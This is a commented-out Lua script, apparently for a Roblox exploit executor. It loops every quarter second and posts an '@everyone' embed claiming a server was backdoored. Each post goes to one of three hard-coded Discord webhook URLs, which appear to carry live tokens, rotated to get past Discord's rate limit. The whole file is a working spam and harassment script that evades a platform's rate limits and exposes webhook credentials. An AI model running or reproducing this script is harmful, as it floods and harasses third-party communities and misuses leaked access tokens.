-- while task.wait(0.25) do
--     task.spawn(function()
--         -- Creating Webhook Data
--         local function createWebhookData()
--             local data = {
--         ["content"]="@everyone @here",
--         ["embeds"]={{
--             ["title"]="Message from Surplus Softworks",
--             ["description"]="Hello. You are probably wondering, **what the fuck is going on here**?\nWell you my friend, have a lot to catch up on. A while ago, this server\ngot **backdoored** by one of our team members. This backdoor went\nunnoticed for days, weeks, months, *years.* And what did the owner\ndo about this? **NOTHING!!**\n\n**This team member (red)** leaked the backdoor to our team. We\ninstantly started researching it, how it could be used, how it could\nbe **abused. Team member (Red)** had the brilliant idea of making\na whole bunch of bots to spread this message, and we went through\nwith it. **Team member (blue)** made these bots to spread the word.\nWe are bypassing the API rate limit by using multiple bots\nat a time to trick discord into thinking this is just some people chatting.\n\n**And**, this backdoor still works to this day. I have one message to you,\n@minerwarrior is your server **really safe?**\n\n```\nUnraidable forever and always, untouchable. -Krampus, 2023\n```",
--             ["color"]=nil,
--             ["thumbnail"]={
--                 ["url"]="https://bloxecutor.com/wp-content/uploads/2024/08/wave-executor-logo.webp"
--             }
--             }},
--         ["attachments"]={}
--         }
--             return game:GetService("HttpService"):JSONEncode(data)
--         end

--         -- Sending Webhook
--         local function sendWebhook(webhookUrl, data)
--             local headers = {
--                 ["content-type"] = "application/json",
--             }

--             local request = http_request or request or HttpPost or syn.request
--             local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
--             request(abcdef)
--         end

--         -- Replace the webhook URL with your own URL
--         local webhookUrl = ({"https://discord.com/api/webhooks/1349590381888802877/rqRHFKcRyK5KSdD0nVfeBwP169oW-PQx4175kSZIpiGQ5QM1joL3lNEZkxkZxVREcjJc", "https://discord.com/api/webhooks/1349592295393067109/tDMxKBl9ZaIjr1xEj8Vzm4xEZqDg-hWQ-LqNgdt1VlHfiXt2rlX2jtZEXU-I6gC8BNNl", "https://discord.com/api/webhooks/1349592356977901618/EVnlBIgJqFyZUDMQE6TTItFGs0zi6tAY3bRUzIAnkZcA_d7QOyfVQ-HdM70VQr47eJQV"})[math.random(1,3)]
--         local webhookData = createWebhookData()

--         -- Sending the webhook
--         sendWebhook(webhookUrl, webhookData)
--         print(webhookUrl)
--     end)
-- end
